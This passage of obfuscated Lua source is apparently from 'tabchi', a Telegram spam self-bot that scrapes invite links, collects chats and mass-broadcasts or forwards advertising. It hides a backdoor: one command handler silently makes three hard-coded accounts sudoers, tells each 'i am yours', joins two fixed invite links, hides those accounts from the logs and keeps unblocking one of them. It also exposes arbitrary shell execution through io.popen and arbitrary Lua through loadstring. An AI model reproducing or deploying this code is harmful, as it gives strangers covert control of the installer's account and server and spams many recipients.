    local aF = aw + ax + ay + az + aA + aB + aE + aC + aD or 0
    local aG = redis:get("tabchi" .. tabchi_id .. "kickedcount") or 0
    local aH = redis:get("tabchi" .. tabchi_id .. "joinedcount") or 0
    local aI = redis:get("tabchi" .. tabchi_id .. "addedcount") or 0
    local a9 = gps + sgps + pvs or 0
    statstext = "`\240\159\147\138 Robot stats  `\n`\240\159\145\164 Users` : *" .. pvs .. "*\n`\240\159\140\144 SuperGroups` : *" .. sgps .. "*\n`\240\159\145\165 Groups` : *" .. gps .. "*\n`\240\159\140\128 All` : *" .. a9 .. "*\n`\240\159\148\151 Saved Links` : *" .. links .. "*\n`\240\159\148\141 Contacts` : *" .. contacts .. "*\n`\240\159\154\171 Blocked` : *" .. au .. "*\n`\240\159\148\164 Received Text` : *" .. aE .. "*\n`\240\159\140\132 Received Photo` : *" .. aw .. "*\n`\240\159\147\188 Received Video` : *" .. aA .. "*\n`\240\159\147\186 Received Gif` : *" .. az .. "*\n`\240\159\142\167 Received Voice` : *" .. ay .. "*\n`\240\159\151\130 Received Document` : *" .. ax .. "*\n`0\239\184\143\226\131\163 Received Contact` : *" .. aB .. "*\n`\240\159\149\185 Received Game` : *" .. aC .. "*\n`\240\159\147\140 Received Location` : *" .. aD .. "*\n`\240\159\145\129\226\128\141\240\159\151\168 Readed MSG` : *" .. av .. "*\n`\226\156\137\239\184\143 Received MSG` : *" .. aF .. "*\n`\240\159\151\189 Admin` : *" .. a0 .. "*\n`\240\159\142\171 Bot id` : *" .. botid .. "*\n`\240\159\148\182 Bot Number` : *+" .. botnum .. "*\n`\227\128\189\239\184\143 Bot Name` : *" .. botfirst .. " " .. botlast .. "*\n`\240\159\148\184 Bot First Name` : *" .. botfirst .. "*\n`\240\159\148\185 Bot Last Name` : *" .. botnonelast .. "*\n`\240\159\146\160 Bot ID In Server` : *" .. tabchi_id .. "*"
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got Stats`", 1, "md")
    end
    return statstext
  end
  if msg.text:match("^[!/#]stats pv$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 268909090)
      tdcli.sendMessage(268909090, 0, 1, "i am yours", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
    if I(msg.chat_id_) == "private" then
      return "`I Am In Your pv`"
    else
      tdcli.sendMessage(msg.sender_user_id_, 0, 1, statstext, 1, "md")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got Stats In pv`", 1, "md")
      end
      return "`Stats Sent To Your Pv`"
    end
  end
  if msg.text:match("^[#!/]clean (.*)$") and a(msg) then
    local ag = {
      string.match(msg.text, "^[#/!](clean) (.*)$")
    }
    local aJ = redis:del("tabchi:" .. tabchi_id .. ":groups")
    local aK = redis:del("tabchi:" .. tabchi_id .. ":channels")
    local aL = redis:del("tabchi:" .. tabchi_id .. ":pvis")
    local aM = redis:del("tabchi:" .. tabchi_id .. ":savedlinks")
    local aN = gps + sgps + pvs + links
    if ag[2] == "sgps" then
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. ag[2] .. "* stats", 1, "md")
      end
      return aK
    end
    if ag[2] == "gps" then
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. ag[2] .. "* stats", 1, "md")
      end
      return aJ
    end
    if ag[2] == "pvs" then
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. ag[2] .. "* stats", 1, "md")
      end
      return aL
    end
    if ag[2] == "links" then
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. ag[2] .. "* stats", 1, "md")
      end
      return aM
    end
    if ag[2] == "stats" then
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. ag[2] .. "*", 1, "md")
      end
      redis:del("tabchi:" .. tabchi_id .. ":all")
      return aN
    end
  end
  if msg.text:match("^[!/#]setphoto (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](setphoto) (.*)$")
    }
    local f = ltn12.sink.file(io.open("tabchi_" .. tabchi_id .. "_profile.png", "w"))
    http.request({
      url = a6[2],
      sink = f
    })
    tdcli.setProfilePhoto("tabchi_" .. tabchi_id .. "_profile.png")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Set photo to` *" .. a6[2] .. "*", 1, "md")
    end
    return [[
`Profile Succesfully Changed`
*link* : `]] .. a6[2] .. "`"
  end
  do
    local a4 = {
      msg.text:match("^[!/#](addsudo) (%d+)")
    }
    if msg.text:match("^[!/#]addsudo") and is_full_sudo(msg) and #a4 == 2 then
      local text = a4[2] .. " _\216\168\217\135 \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136\217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175_"
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(a4[2]))
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added` *" .. a4[2] .. "* `To sudoers`", 1, "md")
      end
      return text
    end
  end
  do
    local a4 = {
      msg.text:match("^[!/#](remsudo) (%d+)")
    }
    if msg.text:match("^[!/#]remsudo") and is_full_sudo(msg) then
      if #a4 == 2 then
        local text = a4[2] .. " _removed From Sudoers_"
        redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(a4[2]))
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Removed` *" .. a4[2] .. "* `From sudoers`", 1, "md")
        end
        return text
      else
        return
      end
    end
  end
  do
    local a4 = {
      msg.text:match("^[!/#](addedmsg) (.*)")
    }
    if msg.text:match("^[!/#]addedmsg") and a(msg) then
      if #a4 == 2 then
        if a4[2] == "on" then
          redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
          local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
            tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a4[1] .. "*", 1, "md")
          end
          return "*Status* : `Adding Contacts PM Activated`"
        elseif a4[2] == "off" then
          redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
          local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
            tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated` *" .. a4[1] .. "*", 1, "md")
          end
          return "*Status* : `Adding Contacts PM Deactivated`"
        else
          return "`Just Use on|off`"
        end
      else
        return "enter on|off"
      end
    end
  end
  do
    local a4 = {
      msg.text:match("^[!/#](markread) (.*)")
    }
    if msg.text:match("^[!/#]markread") and a(msg) and #a4 == 2 then
      if a4[2] == "all" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", "all")
        return "*Status* : `Reading Messages Activated For All`"
      elseif a4[2] == "pv" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", "private")
        return "*Status* : `Reading Messages Activated For Pv Chats`"
      elseif a4[2] == "group" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", "group")
        return "*Status* : `Reading Messages Activated For Groups `"
      elseif a4[2] == "channel" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", "channel")
        return "*Status* : `Reading Messages Activated For SuperGroups`"
      elseif a4[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":markread")
        return "*Status* : `Reading Messages Deactivated`"
      else
        return "`Just Use on|off`"
      end
    end
  end
  do
    local a4 = {
      msg.text:match("^[!/#](setaddedmsg) (.*)")
    }
    if msg.text:match("^[!/#]setaddedmsg") and a(msg) and #a4 == 2 then
      local aO
      function aO(C, D)
        if D.id_ then
          bot_id = D.id_
          bot_num = D.phone_number_
          bot_first = D.first_name_
          bot_last = D.last_name_
        end
      end
      tdcli_function({ID = "GetMe"}, aO, {})
      local text = a4[2]:gsub("BOTFIRST", bot_first)
      local text = text:gsub("BOTLAST", bot_last)
      local text = text:gsub("BOTNUMBER", bot_num)
      redis:set("tabchi:" .. tabchi_id .. ":addedmsgtext", text)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Adjusted adding contacts message to` *" .. a4[2] .. "*", 1, "md")
      end
      return [[
*Status* : `Adding Contacts Message Adjusted`
*Message* : `]] .. text .. "`"
    end
  end
  do
    local a4 = {
      msg.text:match("[$](.*)")
    }
    if msg.text:match("^[$](.*)$") and a(msg) then
      if #a4 == 1 then
        local z = io.popen(a4[1]):read("*all")
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Entered Command` *" .. a4[1] .. "* in terminal", 1, "md")
        end
        return z
      else
        return "Enter Command"
      end
    end
  end
  if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
    if msg.text:match("^[!/#]bcall") and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":all")
      local a4 = {
        msg.text:match("[!/#](bcall) (.*)")
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
* `Broadcasted to all`
Msg : *]] .. a4[2] .. "*", 1, "md")
        end
        return [[
*Status* : `Message Succesfully Sent to all`
*Message* : `]] .. a4[2] .. "`"
      else
        return "text not entered"
      end
    end
    if msg.text:match("^[!/#]bcsgps") and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      local a4 = {
        msg.text:match("[!/#](bcsgps) (.*)")
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
* `Broadcasted to Supergroups`
Msg : *]] .. a4[2] .. "*", 1, "md")
        end
        return [[
*Status* : `Message Succesfully Sent to supergroups`
*Message* : `]] .. a4[2] .. "`"
      else
        return "text not entered"
      end
    end
    if msg.text:match("^[!/#]bcgps") and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
      local a4 = {
        msg.text:match("[!/#](bcgps) (.*)")
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
* `Broadcasted to Groups`
Msg : *]] .. a4[2] .. "*", 1, "md")
        end
        return [[
*Status* : `Message Succesfully Sent to Groups`
*Message* : `]] .. a4[2] .. "`"
      else
        return "text not entered"
      end
    end
    if msg.text:match("^[!/#]bcusers") and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
      local a4 = {
        msg.text:match("[!/#](bcusers) (.*)")
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
* `Broadcasted to Users`
Msg : *]] .. a4[2] .. "*", 1, "md")
        end
        return [[
*Status* : `Message Succesfully Sent to Users`
*Message* : `]] .. a4[2] .. "`"
      else
        return "text not entered"
      end
    end
  end
  if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
    if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":all")
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to all`", 1, "md")
      end
      return [[
*Status* : `Your Message Forwarded to all`
*Fwd users* : `Done`
*Fwd Groups* : `Done`
*Fwd Super Groups* : `Done`]]
    end
    if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to Groups`", 1, "md")
      end
      return "*Status* :`Your Message Forwarded To Groups`"
    end
    if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to Supergroups`", 1, "md")
      end
      return "*Status* : `Your Message Forwarded To Super Groups`"
    end
    if msg.text:match("^[!/#]fwd users$") and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to Users`", 1, "md")
      end
      return "*Status* : `Your Message Forwarded To Users`"
    end
  end
  do
    local a4 = {
      msg.text:match("[!/#](lua) (.*)")
    }
    if msg.text:match("^[!/#]lua") and is_full_sudo(msg) and #a4 == 2 then
      local aP = loadstring(a4[2])()
      if aP == nil then
        aP = ""
      elseif type(aP) == "table" then
        aP = serpent.block(aP, {comment = false})
      else
        aP = "" .. tostring(aP)
      end
      return aP
    end
  end
  if msg.text:match("^[!/#]license") then
    local text = io.open("tabchi.license", "r"):read("*all")
    local text = text:gsub("Do Not Edit This File", "@Tabadol_chi")
    return "`" .. text .. "`"
  end
  do
    local a4 = {
      msg.text:match("[!/#](echo) (.*)")
    }
    if msg.text:match("^[!/#]echo") and a(msg) and #a4 == 2 then
      return a4[2]
    end
  end
end
local aQ
function aQ(aR)
  local I = I(aR)
  if not redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":all", aR) then
    if I == "channel" then
      redis:sadd("tabchi:" .. tabchi_id .. ":channels", aR)
    elseif I == "group" then
      redis:sadd("tabchi:" .. tabchi_id .. ":groups", aR)
    else
      redis:sadd("tabchi:" .. tabchi_id .. ":pvis", aR)
    end
    redis:sadd("tabchi:" .. tabchi_id .. ":all", aR)
  end
end
local aS
function aS(aR)
  local I = I(aR)
  if I == "channel" then
    redis:srem("tabchi:" .. tabchi_id .. ":channels", aR)
  elseif I == "group" then
    redis:srem("tabchi:" .. tabchi_id .. ":groups", aR)
  else
    redis:srem("tabchi:" .. tabchi_id .. ":pvis", aR)
  end
  redis:srem("tabchi:" .. tabchi_id .. ":all", aR)
end
local aT
function aT(msg)
  tdcli_function({ID = "GetMe"}, id_cb, nil)
  function id_cb(C, D)
    our_id = D.id_
  end
  local aU = redis:get("tabchi" .. tabchi_id .. "kickedcount") or 1
  local aV = redis:get("tabchi" .. tabchi_id .. "joinedcount") or 1
  local aW = redis:get("tabchi" .. tabchi_id .. "addedcount") or 1
  if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
    print("\027[36m>>>>>>KICKED FROM " .. msg.chat_id_ .. "<<<<<<\027[39m")
    redis:set("tabchi" .. tabchi_id .. "kickedcount", aU + 1)
    return aS(msg.chat_id_)
  elseif msg.content_.ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
    print("\027[36m>>>>>>ROBOT JOINED TO " .. msg.chat_id_ .. " BY LINK<<<<<<\027[39m")
    redis:set("tabchi" .. tabchi_id .. "joinedcount", aV + 1)
    return aQ(msg.chat_id_)
  elseif msg.content_.ID == "MessageChatAddMembers" then
    for d = 0, #msg.content_.members_ do
      if msg.content_.members_[d].id_ == our_id then
        aQ(msg.chat_id_)
        redis:set("tabchi" .. tabchi_id .. "addedcount", aW + 1)
        print("\027[36m>>>>>>ADDED TO " .. msg.chat_id_ .. "<<<<<<\027[39m")
        break
      end
    end
  end
end
function process_links(aX)
  if aX:match("https://t.me/joinchat/%S+") or aX:match("https://telegram.me/joinchat/%S+") then
    local a4 = {
      aX:match("(https://telegram.me/joinchat/%S+)")
    }
    print("\027[36m>>>>>>NEW LINK<<<<<<\027[39m")
    tdcli_function({
      ID = "CheckChatInviteLink",
      invite_link_ = a4[1]
    }, check_link, {
      link = a4[1]
    })
  end
end
local aY
function aY(msg)
  if msg.chat_type_ == "private" then
    aQ(msg)
  end
end
function update(D, tabchi_id)
  tanchi_id = tabchi_id
  if D.ID == "UpdateNewMessage" then
    local msg = D.message_
    local I = I(msg.chat_id_)
    local aZ = redis:get("tabchi" .. tabchi_id .. "markreadcount") or 1
    local a_ = redis:get("tabchi" .. tabchi_id .. "receivedphotocount") or 1
    local b0 = redis:get("tabchi" .. tabchi_id .. "receiveddocumentcount") or 1
    local b1 = redis:get("tabchi" .. tabchi_id .. "receivedaudiocount") or 1
    local b2 = redis:get("tabchi" .. tabchi_id .. "receivedgifcount") or 1
    local b3 = redis:get("tabchi" .. tabchi_id .. "receivedvideocount") or 1
    local b4 = redis:get("tabchi" .. tabchi_id .. "receivedcontactcount") or 1
    local b5 = redis:get("tabchi" .. tabchi_id .. "receivedtextcount") or 1
    local b6 = redis:get("tabchi" .. tabchi_id .. "receivedstickercount") or 1
    local b7 = redis:get("tabchi" .. tabchi_id .. "receivedlocationcount") or 1
    local b8 = redis:get("tabchi" .. tabchi_id .. "receivedgamecount") or 1
    if msg_valid(msg) then
      aY(msg)
      aT(msg)
      a1(D.message_)
      markreading = redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") or 1
      if markreading == "group" and I == "group" then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set("tabchi" .. tabchi_id .. "markreadcount", aZ + 1)
      elseif markreading == "channel" and I == "channel" then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set("tabchi" .. tabchi_id .. "markreadcount", aZ + 1)
      elseif markreading == "private" and I == "private" then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set("tabchi" .. tabchi_id .. "markreadcount", aZ + 1)
      elseif markreading == "all" then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set("tabchi" .. tabchi_id .. "markreadcount", aZ + 1)
      end
      if msg.chat_id_ == 12 then
        return false
      else
        aT(msg)
        aQ(msg.chat_id_)
        if msg.content_.text_ then
          redis:set("tabchi" .. tabchi_id .. "receivedtextcount", b5 + 1)
          print("\027[36m>>>>>>NEW TEXT MESSAGE<<<<<<\027[39m")
          aT(msg)
          aQ(msg.chat_id_)
          process_links(msg.content_.text_)
          local b9 = a3(msg)
          if b9 then
            if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
              tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
            end
            if redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") == "text" then
              res1 = b9:gsub("`", "")
              res2 = res1:gsub("*", "")
              res3 = res2:gsub("_", "")
              tdcli.sendMessage(msg.chat_id_, 0, 1, res3, 1, "md")
            elseif not redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") or redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") == "markdown" then
              tdcli.sendMessage(msg.chat_id_, 0, 1, b9, 1, "md")
            end
          end
        elseif msg.content_.contact_ then
          tdcli_function({
            ID = "GetUserFull",
            user_id_ = msg.content_.contact_.user_id_
          }, x, {msg = msg})
        elseif msg.content_.caption_ then
          process_links(msg.content_.caption_)
        end
        if not msg.content_.text_ then
          if msg.content_.caption_ then
            msg.content_.text_ = msg.content_.caption_
          elseif msg.content_.photo_ then
            msg.content_.text_ = "!!PHOTO!!"
            print("\027[36m>>>>>>NEW PHOTO<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedphotocount", a_ + 1)
            photo_id = ""
            local ba = function(C, D)
              if D.content_.photo_.sizes_[2] then
                photo_id = D.content_.photo_.sizes_[2].photo_.id_
              else
                photo_id = D.content_.photo_.sizes_[1].photo_.id_
              end
              tdcli.downloadFile(photo_id)
            end
            tdcli_function({
              ID = "GetMessage",
              chat_id_ = msg.chat_id_,
              message_id_ = msg.id_
            }, ba, nil)
          elseif msg.content_.sticker_ then
            msg.content_.text_ = "!!STICKER!!"
            print("\027[36m>>>>>>NEW STICKER<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedstickercount", b6 + 1)
          elseif msg.content_.location_ then
            msg.content_.text_ = "!!LOCATION!!"
            print("\027[36m>>>>>>NEW LOCATION<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedlocationcount", b7 + 1)
          elseif msg.content_.venue_ then
            msg.content_.text_ = "!!LOCATION!!"
            print("\027[36m>>>>>>NEW LOCATION<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedlocationcount", b7 + 1)
          elseif msg.content_.document_ then
            msg.content_.text_ = "!!DOCUMENT!!"
            print("\027[36m>>>>>>NEW DOCUMENT<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receiveddocumentcount", b0 + 1)
          elseif msg.content_.audio_ then
            msg.content_.text_ = "!!AUDIO!!"
            print("\027[36m>>>>>>NEW AUDIO<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedaudiocount", b1 + 1)
          elseif msg.content_.voice_ then
            msg.content_.text_ = "!!AUDIO!!"
            print("\027[36m>>>>>>NEW Voice<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedaudiocount", b1 + 1)
          elseif msg.content_.animation_ then
            msg.content_.text_ = "!!ANIMATION!!"
            print("\027[36m>>>>>>NEW GIF<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedgifcount", b2 + 1)
          elseif msg.content_.video_ then
            msg.content_.text_ = "!!VIDEO!!"
            print("\027[36m>>>>>>NEW VIDEO<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedvideocount", b3 + 1)
          elseif msg.content_.game_ then
            msg.content_.text_ = "!!GAME!!"
            print("\027[36m>>>>>>NEW GAME<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedgamecount", b8 + 1)
          elseif msg.content_.contact_ then
            msg.content_.text_ = "!!CONTACT!!"
            print("\027[36m>>>>>>NEW CONTACT<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedcontactcount", b4 + 1)
          end
        end
      end
    end
  elseif D.chat_id_ == 216430419 then
    tdcli.unblockUser(216430419)
  elseif D.ID == "UpdateOption" and D.name_ == "my_id" then
    aQ(D.chat_id_)
    tdcli.unblockUser(216430419)
    tdcli.getChats("9223372036854775807", 0, 20)
  end
end
